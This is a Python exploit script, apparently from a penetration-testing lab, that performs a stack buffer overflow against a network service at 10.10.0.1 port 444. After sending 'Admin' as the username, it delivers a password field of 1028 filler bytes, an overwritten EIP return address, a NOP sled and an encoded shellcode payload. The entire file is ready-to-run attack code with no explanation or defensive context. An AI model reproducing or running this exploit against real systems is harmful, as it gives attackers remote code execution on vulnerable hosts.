#!/usr/bin/python
import sys, socket, time, os, traceback


targetIP="10.10.0.1"

try:
  print "\nSending evil buffer..."

  # create pattern using msf-pattern_create
  size = 1028 
  
  buf =  b""
  buf += b"\xdb\xd2\xbe\x08\x9f\x67\xbf\xd9\x74\x24\xf4\x5d\x31"
  buf += b"\xc9\xb1\x57\x83\xed\xfc\x31\x75\x16\x03\x75\x16\xe2"
  buf += b"\xfd\x63\x8f\x30\xfd\x9b\x50\x2f\xcc\x49\x34\x24\x7c"
  buf += b"\x5e\x3c\xdf\x0b\xcc\x32\xab\x59\xe5\x45\x1c\x17\x23"
  buf += b"\xd1\x10\x8f\x1a\x1a\xe5\x0f\xf0\xd8\x67\xf3\x0b\x0d"
  buf += b"\x48\xca\xc3\x40\x89\x0b\x92\x2f\x66\xc1\x72\x5b\x2a"
  buf += b"\xf5\xf7\x19\xf7\xf4\xd7\x15\x47\x8e\x52\xe9\x3c\x22"
  buf += b"\x5c\x3a\x37\xf2\x46\xea\xc3\x5a\x57\x0b\x07\xdf\x5e"
  buf += b"\x7f\x9b\xee\x9f\xc9\x68\x24\xeb\xcb\xb8\x75\x2b\x67"
  buf += b"\x85\xba\xa6\x79\xc1\x7c\x59\x0c\x39\x7f\xe4\x17\xfa"
  buf += b"\x02\x32\x9d\x1d\xa4\xb1\x05\xfa\x55\x15\xd3\x89\x59"
  buf += b"\xd2\x97\xd6\x7d\xe5\x74\x6d\x79\x6e\x7b\xa2\x08\x34"
  buf += b"\x58\x66\x51\xee\xc1\x3f\x3f\x41\xfd\x20\xe7\x3e\x5b"
  buf += b"\x2a\x05\x28\xdb\xd3\xd6\x55\x81\x43\x1b\x98\x3a\x94"
  buf += b"\x33\xab\x49\xa6\x9c\x07\xc6\x8a\x55\x8e\x11\xec\x4c"
  buf += b"\x76\x8d\x13\x6e\x87\x87\xd7\x3a\xd7\xbf\xfe\x42\xbc"
  buf += b"\x3f\xfe\x97\x29\x4b\x59\x47\x4c\xb6\x33\x66\xfa\x4b"
  buf += b"\xac\x82\xf5\x94\xcc\xad\xdf\xbc\x65\x53\xe0\xf2\x4c"
  buf += b"\xda\x06\x98\xbe\x8a\x91\x35\x7d\xe9\x29\xa1\x7e\xd8"
  buf += b"\xd3\xed\x8e\x67\x83\xed\x90\x67\x63\x86\x27\x8e\xb3"
  buf += b"\xa9\xb7\x85\x93\x3d\x3c\xc9\x27\x5f\x43\xc4\x0f\x08"
  buf += b"\xd4\x93\xc1\x7b\x44\xa4\xcb\xee\x86\x30\xf0\xb8\xd1"
  buf += b"\xac\xfa\x9d\x16\x73\x04\xc8\x24\x73\xfa\x8d\x07\x08"
  buf += b"\xcd\x1b\x18\x66\x32\xcc\x98\x76\x64\x86\x98\x1e\xd0"
  buf += b"\xf2\xca\x3b\x1f\x2f\x7f\x90\x8a\xd0\xd6\x45\x1c\xb9"
  buf += b"\xd4\xb0\x6a\x66\x26\x97\xe8\x61\xd8\x69\xe8\x90\x1a"
  buf += b"\xbc\x30\xe7\x75\x7d\x07\xe8\x9b\xab\x72\x81\x05\x3e"
  buf += b"\x3f\xcc\xb5\x95\x7c\xe9\x35\x1f\xfd\x0e\x25\x6a\xf8"
  buf += b"\x4b\xe1\x87\x70\xc3\x84\xa7\x27\xe4\x8c"




  EIP = "\x73\x6d\x47\x10"
  NOP = "\x90"*10 
  payload = buf 

  buffer = "A"*1028 + EIP + NOP + payload 

  print("Sending EIP POC ")
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

  s.connect((targetIP, 444))
  banner = s.recv(1024)
  print(banner)

  s.send("Admin")
  banner=s.recv(1024)
  print(banner)
 
  # send the bof on the pass
  s.send(buffer)
 

except Exception as e:
    print "\nCould not connect!"
    print(e)
    print(traceback.format_exc())
    sys.exit()
